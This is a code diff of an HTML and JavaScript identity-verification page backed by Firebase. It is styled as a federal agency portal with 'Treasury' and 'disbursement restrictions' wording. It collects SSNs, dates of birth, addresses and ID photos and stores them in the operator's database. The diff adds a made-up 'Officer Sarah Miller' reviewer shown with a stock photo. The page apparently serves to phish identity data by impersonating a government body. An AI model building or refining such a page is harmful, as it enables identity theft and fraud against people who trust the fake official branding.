@@ -20,7 +20,6 @@
 
         .kyc-card { background: white; border-radius: 20px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
         
-        /* Fixed Input Sizes - Less "Big/Zoomed" */
         .label-text { font-size: 8px; font-weight: 900; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px; display: block; letter-spacing: 0.5px; margin-left: 2px; }
         .input-field { 
             width: 100%; height: 42px; background: #f8fafc; border: 1.5px solid #eef2f6; border-radius: 10px; 
@@ -33,10 +32,14 @@
             font-weight: 900; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;
             border-bottom: 4px solid #001a3d; transition: 0.2s; cursor: pointer;
         }
-        .btn-gov:active { transform: translateY(2px); border-bottom-width: 1px; }
 
-        .status-box { padding: 40px 15px; text-align: center; }
-        .status-icon-wrap { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        /* Support Components */
+        .support-agent-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 12px; margin-top: 25px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
+        .agent-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; border: 2px solid #3b82f6; }
+        .fab-support { position: fixed; bottom: 25px; right: 20px; width: 50px; height: 50px; background: var(--sba-navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); border: 2px solid white; z-index: 999; cursor: pointer; }
+
+        .status-box { padding: 30px 10px; text-align: center; }
+        .status-icon-wrap { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; }
         .review-bg { background: #eff6ff; color: #2563eb; }
         .success-bg { background: #f0fdf4; color: #16a34a; }
 
@@ -102,7 +105,6 @@
                         <select id="gender" class="input-field">
                             <option value="Male">Male</option>
                             <option value="Female">Female</option>
-                            <option value="Other">Other</option>
                         </select>
                     </div>
                 </div>
@@ -119,31 +121,18 @@
                 </div>
 
                 <div class="border-t border-slate-100 my-4 pt-4">
-                    <h2 class="text-[11px] font-black text-slate-800 uppercase tracking-tight mb-4">Residential Address</h2>
-                    
-                    <label class="label-text">Street Address</label>
-                    <input type="text" id="address" class="input-field" placeholder="123 Federal Way">
+                    <label class="label-text">Residential Address</label>
+                    <input type="text" id="address" class="input-field" placeholder="Street Address">
 
                     <div class="grid grid-cols-3 gap-2">
-                        <div class="col-span-1">
-                            <label class="label-text">City</label>
-                            <input type="text" id="city" class="input-field" placeholder="City">
-                        </div>
-                        <div>
-                            <label class="label-text">State</label>
-                            <input type="text" id="state" class="input-field" placeholder="NY">
-                        </div>
-                        <div>
-                            <label class="label-text">Zip Code</label>
-                            <input type="tel" id="zip" class="input-field" placeholder="00000">
-                        </div>
+                        <div class="col-span-1"><input type="text" id="city" class="input-field" placeholder="City"></div>
+                        <div><input type="text" id="state" class="input-field" placeholder="NY"></div>
+                        <div><input type="tel" id="zip" class="input-field" placeholder="Zip"></div>
                     </div>
                 </div>
 
                 <div class="border-t border-slate-100 my-4 pt-4">
                     <h2 class="text-[11px] font-black text-slate-800 uppercase tracking-tight mb-4">Document Upload</h2>
-                    
-                    <label class="label-text">ID Document Type</label>
                     <select id="docType" class="input-field">
                         <option value="Driver License">Driver's License</option>
                         <option value="Passport">Passport</option>
@@ -151,52 +140,71 @@
                     </select>
 
                     <div class="grid grid-cols-2 gap-3 pb-2">
-                        <div class="h-28 border-2 border-dashed border-slate-100 rounded-xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('fIn').click()">
+                        <div class="h-24 border-2 border-dashed border-slate-100 rounded-xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('fIn').click()">
                             <img id="fPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10">
-                            <i class="fas fa-plus text-slate-300"></i>
+                            <i class="fas fa-camera text-slate-300"></i>
                             <span class="text-[8px] font-black text-slate-400 uppercase mt-2">Front Side</span>
                             <input type="file" id="fIn" hidden accept="image/*">
                         </div>
-                        <div class="h-28 border-2 border-dashed border-slate-100 rounded-xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('bIn').click()">
+                        <div class="h-24 border-2 border-dashed border-slate-100 rounded-xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('bIn').click()">
                             <img id="bPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10">
-                            <i class="fas fa-plus text-slate-300"></i>
+                            <i class="fas fa-camera text-slate-300"></i>
                             <span class="text-[8px] font-black text-slate-400 uppercase mt-2">Back Side</span>
                             <input type="file" id="bIn" hidden accept="image/*">
                         </div>
                     </div>
                 </div>
 
-                <button id="submitBtn" class="btn-gov mt-4">Confirm Identity</button>
+                <button id="submitBtn" class="btn-gov mt-2">Confirm Identity</button>
+
+                <div class="mt-6 text-center">
+                    <p class="text-[8px] font-black text-slate-300 uppercase tracking-[0.3em] mb-1">Systems Integrity by</p>
+                    <p class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Abdulahi Isah</p>
+                </div>
             </div>
 
             <div id="pending-box" class="hidden status-box">
                 <div class="status-icon-wrap review-bg">
-                    <i class="fas fa-fingerprint fa-pulse text-3xl"></i>
+                    <i class="fas fa-fingerprint fa-pulse text-2xl"></i>
                 </div>
                 <h2 class="text-lg font-black text-slate-800 uppercase italic">Under Audit</h2>
                 <p class="text-[10px] font-bold text-slate-400 px-4 uppercase mt-4 leading-relaxed tracking-wide">
                     Treasury node #402 is validating your biometrics and address history. 
                 </p>
+
+                <div class="support-agent-box" onclick="location.href='support.html'">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="agent-img">
+                    <div class="text-left">
+                        <p class="text-[10px] font-black text-slate-800 uppercase leading-none mb-1">Officer Sarah Miller</p>
+                        <p class="text-[8px] font-bold text-blue-600 uppercase">Reviewing Documents...</p>
+                    </div>
+                    <i class="fas fa-chevron-right ml-auto text-slate-300 text-[10px]"></i>
+                </div>
+
                 <div class="mt-8 pt-6 border-t border-slate-50">
                     <p class="text-[8px] font-black text-blue-600 uppercase tracking-widest">Case ID: <span id="case-id" class="text-slate-800">---</span></p>
                 </div>
             </div>
 
-            <div id="verified-box" class="hidden status-box">
+            <div id="verified-box" class="hidden status-box text-center">
                 <div class="status-icon-wrap success-bg">
-                    <i class="fas fa-shield-check text-3xl"></i>
+                    <i class="fas fa-shield-check text-2xl"></i>
                 </div>
                 <h2 class="text-lg font-black text-emerald-600 uppercase italic">Authorized</h2>
                 <p class="text-[10px] font-bold text-slate-500 px-4 uppercase mt-4 leading-relaxed">
-                    Identity verified. Federal disbursement restrictions have been removed from your profile.
+                    Identity verified. Federal disbursement restrictions have been removed.
                 </p>
-                <a href="dashboard.html" class="inline-block mt-8 text-[10px] font-black uppercase bg-emerald-600 text-white px-8 py-3 rounded-lg">
-                    Continue
+                <a href="dashboard.html" class="inline-block mt-8 text-[10px] font-black uppercase bg-emerald-600 text-white px-10 py-3 rounded-lg">
+                    Return to Dashboard
                 </a>
             </div>
 
         </div>
     </main>
+
+    <div class="fab-support" onclick="location.href='support.html'">
+        <i class="fas fa-headset"></i>
+    </div>
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
@@ -219,22 +227,17 @@
 
                 f.classList.add('hidden'); p.classList.add('hidden'); v.classList.add('hidden'); r.classList.add('hidden');
 
-                // FIXED: Better status handling
                 const status = data.kycStatus || "IDLE";
 
-                if(status === "UNDER_REVIEW" || status === "PENDING") {
-                    p.classList.remove('hidden');
-                } else if(status === "VERIFIED" || status === "SUCCESSFUL" || status === "APPROVED") {
-                    v.classList.remove('hidden');
-                } else if(status === "DECLINED" || status === "REJECTED" || status === "FAILED") {
+                if(["UNDER_REVIEW", "PENDING"].includes(status)) p.classList.remove('hidden');
+                else if(["VERIFIED", "SUCCESSFUL", "APPROVED"].includes(status)) v.classList.remove('hidden');
+                else if(["DECLINED", "REJECTED", "FAILED"].includes(status)) {
                     f.classList.remove('hidden');
                     if(data.kycNote || data.kycDenialReason) {
                         r.classList.remove('hidden');
                         document.getElementById('decline-text').innerText = data.kycNote || data.kycDenialReason;
                     }
-                } else {
-                    f.classList.remove('hidden');
-                }
+                } else f.classList.remove('hidden');
             });
         });
 
@@ -246,18 +249,15 @@
                 img.src = e.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    const MAX_WIDTH = 400; 
-                    const scale = MAX_WIDTH / img.width;
-                    canvas.width = MAX_WIDTH;
+                    const scale = 400 / img.width;
+                    canvas.width = 400;
                     canvas.height = img.height * scale;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                     const compressed = canvas.toDataURL('image/jpeg', 0.5);
-                    
                     if(side === 'f') frontData = compressed; else backData = compressed;
                     const prev = document.getElementById(side + 'Prev');
-                    prev.src = compressed;
-                    prev.classList.remove('hidden');
+                    prev.src = compressed; prev.classList.remove('hidden');
                 };
             };
             reader.readAsDataURL(file);
@@ -267,25 +267,19 @@
         document.getElementById('bIn').onchange = (e) => processImage(e.target.files[0], 'b');
 
         document.getElementById('submitBtn').onclick = async () => {
-            const btn = document.getElementById('submitBtn');
             const fields = {
                 fullName: document.getElementById('fullName').value,
                 dob: document.getElementById('dob').value,
-                gender: document.getElementById('gender').value,
                 ssn: document.getElementById('ssn').value,
                 phone: document.getElementById('phone').value,
                 address: document.getElementById('address').value,
                 city: document.getElementById('city').value,
                 state: document.getElementById('state').value,
-                zip: document.getElementById('zip').value,
-                docType: document.getElementById('docType').value
+                zip: document.getElementById('zip').value
             };
 
-            if(!frontData || !fields.fullName || !fields.ssn || !fields.address) {
-                return alert("Audit Entry Error: Please fill all required fields and upload ID.");
-            }
+            if(!frontData || !fields.fullName || !fields.ssn) return alert("Please complete form and upload ID.");
 
-            btn.disabled = true;
             document.getElementById('loadingOverlay').style.display = 'flex';
             const loadBar = document.getElementById('loadBar');
             loadBar.style.width = "40%";
@@ -293,18 +287,15 @@
             try {
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
                     ...fields,
-                    idFront: frontData, 
-                    idBack: backData,
+                    idFront: frontData, idBack: backData,
                     kycStatus: "UNDER_REVIEW",
-                    kycDate: new Date().toLocaleString(),
-                    kycNote: ""
+                    kycDate: new Date().toLocaleString()
                 });
                 loadBar.style.width = "100%";
                 setTimeout(() => { document.getElementById('loadingOverlay').style.display = 'none'; }, 800);
             } catch (err) {
-                alert("Audit Connection Interrupted.");
                 document.getElementById('loadingOverlay').style.display = 'none';
-                btn.disabled = false;
+                alert("Submission failed.");
             }
         };
     </script>
